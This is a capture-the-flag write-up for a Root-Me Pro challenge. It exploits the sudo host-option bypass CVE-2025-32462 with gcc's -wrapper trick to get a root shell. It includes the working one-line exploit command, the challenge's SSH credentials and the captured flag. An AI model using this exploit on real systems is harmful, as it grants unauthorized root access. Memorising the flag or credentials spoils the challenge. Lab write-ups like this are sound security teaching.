# Linux Privesc - CVE — "Sudo ré mi fa sol"

**Platform:** Root-Me Pro (RootBox) · **Category:** System · **Difficulty:** Easy · **Points:** 250

## Challenge
An SSH account on a production server plus a copy of `/etc/sudoers`. Prove the box is
exploitable by reading `/root/flag.txt`.

```
ssh -p 32137 user@sockets.challenges.root-me.pro   # password: password
```

## Recon

The provided sudoers is tiny, and the interesting line is host-scoped:

```
Host_Alias PROD    = rmp
Host_Alias PREPROD = preprod-rmp

user PREPROD=(root:root) NOPASSWD:/usr/bin/gcc
```

`user` may run `gcc` as root — **but only on `preprod-rmp`**. On the box we land on:

```
$ hostname
rmp
$ sudo --version | head -1
Sudo version 1.9.16p1
$ sudo -n -l
sudo: a password is required          # no rule matches on PROD
```

Two signals line up: a rule deliberately parked on a host we are *not* on, and sudo
1.9.16p1. The title ("Sudo ré mi fa sol") is a pun on the *host* pitch — `-h`.

## Vulnerability — CVE-2025-32462

sudo's `-h` / `--host` option was only ever meant to make `sudo -l` and `sudo -v` report
what a user could do on *another* host. In every sudo release from 1.8.8 through 1.9.17
(fixed in **1.9.17p1**), the option was also honoured when actually **running a command**.
The sudoers plugin then matched `Host`/`Host_Alias` entries against the attacker-supplied
name instead of the real hostname, so any rule scoped to a different host in a shared
(e.g. LDAP/central) sudoers file could be executed locally.

Confirming the bypass:

```
$ sudo -n -h preprod-rmp -l
Matching Defaults entries for user on preprod-rmp:
    lecture=never

User user may run the following commands on preprod-rmp:
    (root : root) NOPASSWD: /usr/bin/gcc
```

## Solution

`gcc` is a GTFOBins entry: `-wrapper <prog>,<args>` tells gcc to run every subprocess
through `prog`, so `-wrapper /bin/sh,-s` makes it exec a shell (inheriting root) instead
of the assembler. The trailing `.` is a dummy input file so gcc gets that far.

```bash
echo "id; cat /root/flag.txt" | sudo -n -h preprod-rmp /usr/bin/gcc -wrapper /bin/sh,-s .
```

```
uid=0(root) gid=0(root) groups=0(root)
RM{d96dba59698e52e5674a73829364071a}
```

Interactively, `sudo -h preprod-rmp /usr/bin/gcc -wrapper /bin/sh,-s .` drops a root shell.

## Flag

```
RM{d96dba59698e52e5674a73829364071a}
```

## Lesson

- **Host scoping in sudoers is not a security boundary on sudo < 1.9.17p1.** If `sudo -l`
  says "a password is required", re-run it as `sudo -h <other-host> -l` before concluding
  you have no sudo rights. Cheap, and it's the whole challenge here.
- Read sudoers for *structure*, not just the command list: a `Host_Alias` that doesn't
  match `hostname` is a planted hint, not a dead end.
- Any compiler/interpreter granted via sudo is a root shell. gcc's route is
  `-wrapper /bin/sh,-s` (also `-B`, or `@file` tricks). Check GTFOBins before assuming a
  "harmless" binary is safe.
- Two related sudo CVEs landed together in June 2025 — **CVE-2025-32462** (`-h` host
  bypass) and **CVE-2025-32463** (`--chroot` / `chroot(2)` NSS load, root for *any* local
  user). Both fixed in 1.9.17p1, so that version string is the thing to check.
- Tooling: `sudo -n` (non-interactive) matters when driving sudo over a scripted SSH
  session — without it, sudo blocks forever on an unread password prompt.
